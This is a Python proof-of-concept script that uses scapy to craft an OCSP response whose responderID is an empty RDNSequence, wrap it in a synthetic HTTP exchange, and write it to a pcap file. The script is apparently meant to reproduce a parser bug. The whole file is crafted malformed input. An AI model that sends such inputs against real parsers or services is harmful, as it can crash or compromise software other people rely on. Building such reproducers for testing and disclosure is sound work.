#!/usr/bin/env python3
# HTTP/1.1 response carrying a crafted OCSP response whose BasicOCSPResponse uses
# a byName responderID with an EMPTY RDNSequence (30 00). Emits poc.pcap.
from scapy.all import IP, TCP, Raw, wrpcap


def tlv(tag, val):
    l = len(val)
    if l < 0x80:
        lb = bytes([l])
    elif l < 0x100:
        lb = bytes([0x81, l])
    else:
        lb = bytes([0x82, l >> 8, l & 0xFF])
    return bytes([tag]) + lb + val


def build_ocsp():
    oid_basic = bytes.fromhex("06092B0601050507300101")
    sigalg = tlv(0x30, bytes.fromhex("06092A864886F70D01010B") + tlv(0x05, b""))
    responderID = tlv(0xA1, tlv(0x30, b""))  # byName [1] { empty RDNSequence 30 00 }
    produced = tlv(0x18, b"20240101000000Z")
    responses = tlv(0x30, b"")
    respdata = tlv(0x30, responderID + produced + responses)
    signature = tlv(0x03, b"\x00" + b"\xab" * 200)
    basic = tlv(0x30, respdata + sigalg + signature)
    respbytes = tlv(0x30, oid_basic + tlv(0x04, basic))
    status = tlv(0x0A, b"\x00")
    return tlv(0x30, status + tlv(0xA0, respbytes))


der = build_ocsp()
body = der
http_resp = (
    b"HTTP/1.1 200 OK\r\nContent-Type: application/ocsp-response\r\n"
    b"Content-Length: "
    + str(len(body)).encode()
    + b"\r\nConnection: close\r\n\r\n"
    + body
)
http_req = b"GET /ocsp HTTP/1.1\r\nHost: ocsp.evil.test\r\n\r\n"

cip = "10.0.0.1"
sip = "10.0.0.2"
cp = 44444
sp = 80
SYN, ACK, PSH, FIN = 0x02, 0x10, 0x08, 0x01
cs, ss = 1000, 5000
pkts = []


def pkt(src, dst, sport, dport, seq, ack, flags, payload=b""):
    p = IP(src=src, dst=dst) / TCP(
        sport=sport, dport=dport, seq=seq, ack=ack, flags=flags
    )
    if payload:
        p = p / Raw(load=payload)
    return p


pkts.append(pkt(cip, sip, cp, sp, cs, 0, "S"))
cs += 1
pkts.append(pkt(sip, cip, sp, cp, ss, cs, "SA"))
ss += 1
pkts.append(pkt(cip, sip, cp, sp, cs, ss, "A"))
pkts.append(pkt(cip, sip, cp, sp, cs, ss, "PA", http_req))
cs += len(http_req)
pkts.append(pkt(sip, cip, sp, cp, ss, cs, "A"))
pkts.append(pkt(sip, cip, sp, cp, ss, cs, "PA", http_resp))
ss += len(http_resp)
pkts.append(pkt(cip, sip, cp, sp, cs, ss, "A"))

wrpcap("ocsp-empty-responderid.pcap", pkts)
print(
    f"wrote ocsp-empty-responderid.pcap ({len(pkts)} packets), ocsp der {len(der)} bytes"
)
